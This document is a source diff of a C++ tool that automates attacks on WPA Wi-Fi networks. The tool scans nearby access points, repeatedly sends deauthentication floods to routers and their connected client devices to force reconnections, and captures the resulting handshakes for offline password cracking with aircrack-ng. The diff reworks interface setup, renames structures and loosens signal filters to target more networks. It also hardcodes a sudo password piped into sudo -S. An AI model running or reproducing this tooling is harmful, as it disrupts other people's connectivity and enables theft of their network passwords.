@@ -5,9 +5,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <memory.h>
-#include <sys/wait.h>
-#include <string>
+#include <unistd.h>
 #include <sys/stat.h> 
+#include <string>
 #include <list>
 #include <atomic>
 #include <thread>
@@ -18,19 +18,22 @@
 #define SUDO "echo \"51211314\" | sudo -S sh -c "
 #define STDOUTERR_OFF ""
 #define STDERR_OFF ""
+#define SEARCH_DURATION 5
+#define DEAUTH_ATTACK_TIMES 3
+#define DEAUTH_ATTACK_INTERVAL 5
 #else
 #define SUDO ""
 #define STDOUTERR_OFF "2>/dev/null 1>&2"
 #define STDERR_OFF "2>/dev/null"
+#define SEARCH_DURATION 30
+#define DEAUTH_ATTACK_TIMES 10
+#define DEAUTH_ATTACK_INTERVAL 20
 #endif
 
+#define IW_PHY "phy0"
+#define IMONITOR "oiramon"
 #define CAPTURE_DIR "./capture"
-#define SEARCH_DURATION 20
-#define DEAUTH_ATTACK_TIMES 5
-#define DEAUTH_ATTACK_INTERVAL 10
 #define SEC_TO_MS(sec) (sec * 1000000)
-
-char interface[32] = { 0 };
 
 struct StationData
 {
@@ -41,7 +44,7 @@ struct StationData
 	bool operator < (const StationData& rhs) const { return power > rhs.power; }
 };
 
-struct APData
+struct WAPData
 {
 	char  bssid[18] = { 0 };
 	int   channel = 0;
@@ -49,7 +52,7 @@ struct APData
 	char  essid[33] = { 0 };
 	std::list<StationData> stations;
 
-	bool operator < (const APData& rhs) const { return channel == rhs.channel ? power > rhs.power : channel > rhs.channel; }
+	bool operator < (const WAPData& rhs) const { return channel == rhs.channel ? power > rhs.power : channel < rhs.channel; }
 };
 
 struct AirCrack
@@ -61,12 +64,12 @@ struct AirCrack
 	std::atomic<bool> handshaked = ATOMIC_VAR_INIT(false);
 	char workpath[18] = { 0 };
 
-	AirCrack(APData& ap);
+	AirCrack(WAPData& wapdata);
 	~AirCrack();
 };
 
 void clear();
-std::list<APData> get_ap_from_csv(char* csv);
+std::list<WAPData> get_wap_from_csv(char* csv);
 std::list<StationData> get_stations_from_csv(char* csv);
 
 void skip(char*& offset, char*& end, int length)
@@ -81,51 +84,89 @@ void skip(char*& offset, char*& end, int length)
 
 int main()
 {
+	clear();
+	bool monitor_interface_added = false;
     char cmd[512] = { 0 };
 
-	clear();
-
-    // find interface
-	FILE* iwconfig = popen("iwconfig", "r");
-	if (iwconfig)
+    // check software interface mode could be add
+	int iw_phy_status = 0;
+	sprintf(cmd, "/sys/class/ieee80211/%s", IW_PHY);
+	if (access(cmd, F_OK) == 0)
 	{
-        while (fgets(cmd, sizeof(cmd), iwconfig) != NULL)
-        {
-            char* offset = strstr(cmd, "IEEE 802.11");
-            if (offset)
-            {
-				if (strstr(cmd, "wlx") || strstr(cmd, "wlan"))
+		sprintf(cmd, "iw %s info", IW_PHY);
+		FILE* iwinfo = popen(cmd, "r");
+		if (iwinfo)
+		{
+			while (fgets(cmd, sizeof(cmd), iwinfo) != NULL)
+			{
+				switch (iw_phy_status)
 				{
-					int length = offset - cmd - 2;
-					memcpy(interface, cmd, length);
-					interface[length] = 0;
+					case 0:
+					if (strstr(cmd, "Supported interface modes:"))
+						iw_phy_status = 1;
 					break;
+
+					case 1:
+					if (strstr(cmd, "* monitor"))
+						iw_phy_status = 2;
+					break;
+
+					case 2:
+					if (strstr(cmd, "software interface modes (can always be added):"))
+						iw_phy_status = 3;
+					break;
+
+					case 3:
+					if (strstr(cmd, "* monitor"))
+						iw_phy_status = 4;
+					break;
+
+					default: break;
 				}
-            }
-        }
-        pclose(iwconfig);
+			}
+			pclose(iwinfo);
+		}
 	}
 
-	// wlan interface exist
-    if (*interface)
-    {
-		bool monitor_mode_enabled = false;
-		// switch to monitor mode
-		sprintf(cmd, SUDO"\"rfkill unblock 0 && airmon-ng check kill && airmon-ng start %s\" %s", interface, STDOUTERR_OFF);
+	// check status of soft/hard is unblocked
+	if (iw_phy_status == 4)
+	{
+		bool iw_phy_blocked = false;
+		sprintf(cmd, "rfkill list %c", IW_PHY[3]);
+		FILE* rfkill = popen(cmd, "r");
+		if (rfkill)
+		{
+			while (fgets(cmd, sizeof(cmd), rfkill) != NULL)
+			{
+				if (strstr(cmd, "Soft blocked: yes"))
+				{
+					iw_phy_blocked = true;
+					break;
+				}
+			}
+			pclose(rfkill);
+		}
+
+		if (iw_phy_blocked)
+		{
+			sprintf(cmd, "rfkill unblock %c", IW_PHY[3]);
+			system(cmd);
+		}
+
+		// add monitor interface
+		sprintf(cmd, SUDO"\"iw phy %s interface add %s type monitor\"", IW_PHY, IMONITOR);
 		system(cmd);
+		monitor_interface_added = true;
 
 		// check monitor mode is enabled
+		bool monitor_mode_enabled = false;
 		FILE* iwconfig = popen("iwconfig", "r");
 		if (iwconfig)
 		{
 			while (fgets(cmd, sizeof(cmd), iwconfig) != NULL)
 			{
-				char* offset = strstr(cmd, "IEEE 802.11  Mode:Monitor");
-				if (offset)
+				if(strstr(cmd, IMONITOR) && strstr(cmd, "IEEE 802.11  Mode:Monitor"))
 				{
-					int length = offset - cmd - 2;
-					memcpy(interface, cmd, length);
-					interface[length] = 0;
 					monitor_mode_enabled = true;
 					break;
 				}
@@ -143,8 +184,8 @@ int main()
 				sprintf(elapsed_time, "%d", SEARCH_DURATION);
 
 				char dumpcmd[1024] = { 0 };
-				sprintf(dumpcmd, SUDO"\"airodump-ng %s -a -u 1 -I 1 --ignore-negative-one -o csv -w ./%s/ap\" 2>&1", 
-					interface, CAPTURE_DIR);
+				sprintf(dumpcmd, SUDO"\"airodump-ng %s -a -u 1 -I 1 --ignore-negative-one -o csv -w ./%s/wap\" 2>&1", 
+					IMONITOR, CAPTURE_DIR);
 				FILE* airodump = popen(dumpcmd, "r");
 				if (airodump)
 				{
@@ -181,7 +222,7 @@ int main()
 
 	// analyse csv file
 	char* csv = 0;
-	FILE* fp = fopen(CAPTURE_DIR"/ap-01.csv", "rt");
+	FILE* fp = fopen(CAPTURE_DIR"/wap-01.csv", "rt");
 	if (fp)
 	{
 		// read csv into memory
@@ -198,21 +239,21 @@ int main()
 	}
 
 	// check csv is valid
-	std::list<APData> ap_set;
+	std::list<WAPData> wap_set;
 	if (csv)
 	{
-		ap_set = get_ap_from_csv(csv);
+		wap_set = get_wap_from_csv(csv);
 		auto station_set = get_stations_from_csv(csv);
 		delete[] csv;
 
-		// add station mac to its own ap
+		// add station mac to its own wap
 		for (auto& station : station_set)
 		{
-			for (auto& ap : ap_set)
+			for (auto& wap : wap_set)
 			{
-				if (strcmp(ap.bssid, station.bssid) == 0)
+				if (strcmp(wap.bssid, station.bssid) == 0)
 				{
-					ap.stations.push_back(station);
+					wap.stations.push_back(station);
 					break;
 				}
 			}
@@ -221,16 +262,16 @@ int main()
 
 	#ifdef _DEBUG
 	// write to file for debug
-	if (!ap_set.empty())
+	if (!wap_set.empty())
 	{
 		FILE* fp;
-		fp = fopen(CAPTURE_DIR"/ap.txt", "wt");
+		fp = fopen(CAPTURE_DIR"/wap.txt", "wt");
 		if (fp)
 		{
-			for (auto& ap : ap_set)
+			for (auto& wap : wap_set)
 			{
-				fprintf(fp, "ap -    bssid: %s, power: %3d, channel: %2d, essid: %s\n", ap.bssid, ap.power, ap.channel, ap.essid);
-				for (auto& station : ap.stations)
+				fprintf(fp, "wap -   bssid: %s, power: %3d, channel: %2d, essid: %s\n", wap.bssid, wap.power, wap.channel, wap.essid);
+				for (auto& station : wap.stations)
 				{
 					fprintf(fp, "station - mac: %s, power: %3d\n", station.mac, station.power);
 				}
@@ -240,32 +281,35 @@ int main()
 	}
 	#endif
 
-	if (!ap_set.empty())
+	if (!wap_set.empty())
 	{
-		int channel = ap_set.front().channel;
-		// waiting to capture handbag of aps
+		// multi-thread on same channel
+		int channel = wap_set.front().channel;
 		{
+			// waiting to capture handbag of aps
 			std::list<std::unique_ptr<AirCrack>> crack_set;
-			for (auto& ap : ap_set)
+			for (auto& wap : wap_set)
 			{
-				if (channel == ap.channel)
+				if (channel == wap.channel)
 				{
-					crack_set.push_back(std::make_unique<AirCrack>(ap));
+					crack_set.push_back(std::make_unique<AirCrack>(wap));
 				}
 				else
 				{
-					channel = ap.channel;
+					channel = wap.channel;
 					crack_set.clear();
+					crack_set.push_back(std::make_unique<AirCrack>(wap));
 				}
 			}
 		}
 	}
  
 	clear();
-	sprintf(cmd, SUDO"\"airmon-ng stop %s\" %s", interface, STDOUTERR_OFF);
-	system(cmd);
-	sprintf(cmd, SUDO"\"service network-manager start\" %s", STDERR_OFF);
-	system(cmd);
+	if (monitor_interface_added)
+	{
+		sprintf(cmd, SUDO"\"iw %s del\"", IMONITOR);
+		system(cmd);
+	}
 
     return 0;
 }
@@ -276,14 +320,14 @@ void clear()
     char cmd[128] = { 0 };
 	sprintf(cmd, "mkdir %s 2>/dev/null", CAPTURE_DIR);
 	system(cmd);
-	sprintf(cmd, "rm -f %s/ap-*.* >/dev/null", CAPTURE_DIR);
+	sprintf(cmd, "rm -f %s/wap-*.* >/dev/null", CAPTURE_DIR);
 	system(cmd);
 }
 
-std::list<APData> get_ap_from_csv(char* csv)
+std::list<WAPData> get_wap_from_csv(char* csv)
 {
 	// find bssid
-	std::list<APData> ap_set;
+	std::list<WAPData> wap_set;
 	char* bss_begin = strstr(csv, "BSSID,");
 	if (bss_begin)
 	{
@@ -296,15 +340,15 @@ std::list<APData> get_ap_from_csv(char* csv)
 
 			while (offset < bss_end)
 			{
-				APData ap;
+				WAPData wap;
 				// BSSID
-				if (offset + sizeof(APData::bssid) < bss_end)
+				if (offset + sizeof(WAPData::bssid) < bss_end)
 				{
 					char* find = strchr(offset, ',');
 					if (find)
 					{
-						if (size_t(find - offset) < sizeof(APData::bssid))
-							memcpy(ap.bssid, offset, find - offset);
+						if (size_t(find - offset) < sizeof(WAPData::bssid))
+							memcpy(wap.bssid, offset, find - offset);
 						offset = find + 2;
 					}
 				}
@@ -325,7 +369,7 @@ std::list<APData> get_ap_from_csv(char* csv)
 						{
 							char ch[3] = { 0 };
 							memcpy(ch, offset, find - offset);
-							ap.channel = atoi(ch);
+							wap.channel = atoi(ch);
 						}
 						offset = find + 2;
 					}
@@ -363,7 +407,7 @@ std::list<APData> get_ap_from_csv(char* csv)
 						{
 							char pwr[4] = { 0 };
 							memcpy(pwr, offset, find - offset);
-							ap.power = atoi(pwr);
+							wap.power = atoi(pwr);
 						}
 						offset = find + 2;
 					}
@@ -382,13 +426,13 @@ std::list<APData> get_ap_from_csv(char* csv)
 				skip(offset, bss_end, 2);
 
 				// ESSID
-				if (offset + sizeof(APData::essid) < bss_end)
+				if (offset + sizeof(WAPData::essid) < bss_end)
 				{
 					char* find = strchr(offset, ',');
 					if (find)
 					{
-						if (size_t(find - offset) < sizeof(APData::essid))
-							memcpy(ap.essid, offset, find - offset);
+						if (size_t(find - offset) < sizeof(WAPData::essid))
+							memcpy(wap.essid, offset, find - offset);
 						offset = find + 2;
 					}
 				}
@@ -402,27 +446,27 @@ std::list<APData> get_ap_from_csv(char* csv)
 				}
 
 				// check data is valid
-				if (strstr(privacy, "WPA") && (-80 < ap.power && ap.power < -1) &&  ap.essid[0] &&
+				if (strstr(privacy, "WPA") && wap.power != -1 &&  wap.essid[0] &&
 					// telecommunications operators
-					!strstr(ap.essid, "CMCC") && !strstr(ap.essid, "and-Business") && !strstr(ap.essid, "ChinaNet") &&
+					!strstr(wap.essid, "CMCC") && !strstr(wap.essid, "and-Business") && !strstr(wap.essid, "ChinaNet") &&
 					// tachograph
-					!strstr(ap.essid, "HZTY") && !strstr(ap.essid, "DVR") && !strstr(ap.essid, "CarCam") && !strstr(ap.essid, "CAR") && 
-					!strstr(ap.essid, "DV") && !strstr(ap.essid, "NISSAN") && !strstr(ap.essid, "Volvo") && !strstr(ap.essid, "LLD") && 
-					!strstr(ap.essid, "SGM") && !strstr(ap.essid, "vYou_") && !strstr(ap.essid, "IOV") && !strstr(ap.essid, "golo") &&
-					!strstr(ap.essid, "mini3_Pro") && !strstr(ap.essid, "70mai_d01") && !strstr(ap.essid, "HZA50") && !strstr(ap.essid, "SUNLINK") &&
+					!strstr(wap.essid, "HZTY") && !strstr(wap.essid, "DVR") && !strstr(wap.essid, "CarCam") && !strstr(wap.essid, "CAR") && 
+					!strstr(wap.essid, "DV") && !strstr(wap.essid, "NISSAN") && !strstr(wap.essid, "Volvo") && !strstr(wap.essid, "LLD") && 
+					!strstr(wap.essid, "SGM") && !strstr(wap.essid, "vYou_") && !strstr(wap.essid, "IOV") && !strstr(wap.essid, "golo") &&
+					!strstr(wap.essid, "mini3_Pro") && !strstr(wap.essid, "70mai_d01") && !strstr(wap.essid, "HZA50") && !strstr(wap.essid, "SUNLINK") &&
 					// phone
-					!strstr(ap.essid, "iPhone") && !strstr(ap.essid, "vivo") && !strstr(ap.essid, "ZTE") && !strstr(ap.essid, "Honor"))
+					!strstr(wap.essid, "iPhone") && !strstr(wap.essid, "vivo") && !strstr(wap.essid, "ZTE") && !strstr(wap.essid, "Honor"))
 				{
-					ap_set.emplace_back(ap);
+					wap_set.emplace_back(wap);
 				}
 			}
 
 			// sort by power
-			ap_set.sort();
+			wap_set.sort();
 		}
 	}
 
-	return ap_set;
+	return wap_set;
 }
 
 std::list<StationData> get_stations_from_csv(char* csv)
@@ -499,7 +543,7 @@ std::list<StationData> get_stations_from_csv(char* csv)
 				}
 
 				// check data is valid
-				if (station.mac && (-80 < station.power && station.power < -1))
+				if (station.mac && station.power != -1)
 				{
 					station_set.emplace_back(station);
 				}
@@ -511,36 +555,35 @@ std::list<StationData> get_stations_from_csv(char* csv)
 	return station_set;
 }
 
-AirCrack::AirCrack(APData& ap)
+AirCrack::AirCrack(WAPData& wap)
 {
 	char* p = workpath;
-	memcpy(workpath, ap.bssid, sizeof(workpath));
+	memcpy(workpath, wap.bssid, sizeof(workpath));
 	while (p = strchr(p, ':')) *p = '-';
 
 	char cmd[128] = { 0 };
 	sprintf(cmd, "%s/%s", CAPTURE_DIR, workpath);
 	mkdir(cmd, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
 
-	handshaked_thread = std::thread([this, &ap](){
+	handshaked_thread = std::thread([this, &wap](){
 		char cmd[1024] = { 0 };
 
 		// monitoring wireless router with bssid
 		sprintf(cmd, SUDO"\"airodump-ng %s -w ./%s/%s/ -c %d --bssid %s -u 1 -I 1 -o cap,csv\" 2>&1", 
-			interface, CAPTURE_DIR, workpath, ap.channel, ap.bssid);
+			IMONITOR, CAPTURE_DIR, workpath, wap.channel, wap.bssid);
 		FILE* airodump = popen(cmd, "r");
 		if (airodump)
 		{
 			auto check_csv_interval = time(NULL);
 			while(running)
 			{
-				//fread(cmd, sizeof(cmd), 1, airodump);
 				fgets(cmd, sizeof(cmd), airodump);
 				if (strstr(cmd, "handshake:"))
 					handshaked = true;
 
 				if (!handshaked)
 				{
-					if (ap.stations.empty() &&
+					if (wap.stations.empty() &&
 						time(NULL) - check_csv_interval > 1)
 					{
 						check_csv_interval = time(NULL);
@@ -570,7 +613,7 @@ AirCrack::AirCrack(APData& ap)
 							if(!stations.empty())
 							{
 								stations_mutex.lock();
-								ap.stations.swap(stations);
+								wap.stations.swap(stations);
 								stations_mutex.unlock();
 							}
 						}
@@ -581,19 +624,19 @@ AirCrack::AirCrack(APData& ap)
 		}
 	});
 
-	deauthattack_thread = std::thread([this, &ap](){
+	deauthattack_thread = std::thread([this, &wap](){
 		char cmd[256] = { 0 };
 		for (int n = 0; !handshaked && n < DEAUTH_ATTACK_TIMES; ++n)
 		{
-			// sending deauth attack to ap
-			sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s %s\" %s", ap.bssid, interface, STDOUTERR_OFF);
+			// sending deauth attack to wap
+			sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s %s\" %s", wap.bssid, IMONITOR, STDOUTERR_OFF);
 			system(cmd);
 
 			// Let the bullet fly for a while
 			usleep(SEC_TO_MS(DEAUTH_ATTACK_INTERVAL));
 
 			stations_mutex.lock();
-			auto stations = ap.stations;
+			auto stations = wap.stations;
 			stations_mutex.unlock();
 
 			// sending deauth attack to station
@@ -601,9 +644,9 @@ AirCrack::AirCrack(APData& ap)
 			{
 				for (auto& station : stations)
 				{
-					if (-80 < station.power && station.power < -1)
+					if (station.power != -1)
 					{
-						sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s -c %s %s\" %s", ap.bssid, station.mac, interface, STDOUTERR_OFF);
+						sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s -c %s %s\" %s", wap.bssid, station.mac, IMONITOR, STDOUTERR_OFF);
 						system(cmd);
 					}
 				}
@@ -618,7 +661,7 @@ AirCrack::AirCrack(APData& ap)
 
 		if (handshaked)
 		{
-			sprintf(cmd, "aircrack-ng %s/%s/-01.cap -j %s/%s_%s %s", CAPTURE_DIR, workpath, CAPTURE_DIR, ap.essid, workpath, STDERR_OFF);
+			sprintf(cmd, "aircrack-ng %s/%s/-01.cap -j %s/%s_%s %s", CAPTURE_DIR, workpath, CAPTURE_DIR, wap.essid, workpath, STDERR_OFF);
 			system(cmd);
 		}
 	});
